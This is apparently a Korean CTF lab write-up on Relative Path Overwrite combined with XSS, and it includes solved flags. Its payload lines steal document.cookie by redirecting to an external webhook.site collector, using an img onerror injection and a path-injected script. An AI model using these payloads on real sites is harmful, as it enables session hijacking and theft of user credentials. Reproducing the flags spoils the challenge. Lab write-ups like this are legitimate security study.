---
slug: "relative-path-overwrite"
title: "Relative Path Overwrite"
date: 2026-07-21
category: "웹 해킹"
tags: []
excerpt: "**Grade** : G4 **Date** : 2026 07 20"
readingTime: 3
---

**Grade** : G4
**Date** : 2026 07 20

https://mnzy.tistory.com/175#base-uri%20%EB%AF%B8%EC%A7%80%EC%A0%95-1
통칭 RPO라고 함

RPO 설명 : 경로를 브라우저가 잘못 인식하거나, 잘못된 경로 설정으로 발생되어 원래의 의도한 경로를 해커가 의도한 경로로 덮어씌우는 취약점 이라고 함.

그니까 
![](assets/images/posts/Pasted%20image%2020260721000157.png)
정상 상황이면 http://localhost:8090/filter.js 링크 읽었을때 이렇게 나오는데

이렇게 비정상 적인 상황이면 링크가 저렇게 꼬여서 나옴 
![](assets/images/posts/Pasted%20image%2020260721000300.png)
http://localhost:8090/index.php/filter.js -> 이렇게 나온 주소는 기존처럼 filter.js가 나오지 않고 원본 페이지의 html을 표시해줌

이게 다
![](assets/images/posts/Pasted%20image%2020260721000418.png)
이것처럼 코드에 절대경로로 나오는게 아니라 상대경로로 떡 하니 해놔서 이런거임

그래서 이게 무슨 문제가 생기냐?
필터링을 우회해서 js 문법을 실행시킬 수 있다 이거임 근데 이문제 말고 이 다음 문제에서 나올 예정

```payload
index.php/?page=vuln&param=<img src=x onerror=location.href="https://webhook.site/909a0a49-d43c-4437-a2f4-9cc4603b8d2f/"%2bdocument.cookie>
```
-> flag : **DH{1461b2674a46c45172c83e27c35eea06}**


---
# Advanced

여기선 /static에 js 파일이 들어 있음
![](assets/images/posts/Pasted%20image%2020260721012413.png)
![](assets/images/posts/Pasted%20image%2020260721012431.png)

이렇게 뜨는데 이유는 아래 코드처럼 실제로 없는 경로라면 not found가 뜨는 로직이 짜여져 있어서 그럼
```php
<?php
    header("HTTP/1.1 200 OK");
    echo $_SERVER["REQUEST_URI"] . " not found.";
?>
```

여기서!!! RPO+XSS를 사용하는거
```
/index.php/;alert(1);//?page=vuln&param=dreamhack
```
원래 js 코드가 로딩돼야 할 자리에 처음에 기존 코드를 `;` 로 끊어주고 뒷부분을 주석 처리 `//` 해서 js 코드를 실행 시킬 수 있음

그니까 RPO는 원래 로드되어야 할 파일 대신 공격자가 원하는 내용(HTML 응답 등)을 그 자리에 채워 넣는 것 여기에선 XSS를 중간에 삽입 (이후에 연결되는 애가 js 니까 XSS, CSS가 로딩되면 Css injection) 

그럼 위에서 했던거 다시 시도
```
index.php/;location.href="https://webhook.site/909a0a49-d43c-4437-a2f4-9cc4603b8d2f/"%2bdocument.cookie;//?page=vuln&param=dreamhack
```
-> 오늘의 교훈 : 드림핵 request bin 쓰지말자 , 봇 들어가 있는 애들은 로컬에서 돌리지 말자

**DH{7B1461b2674a46c45172c83e27c35eea06}**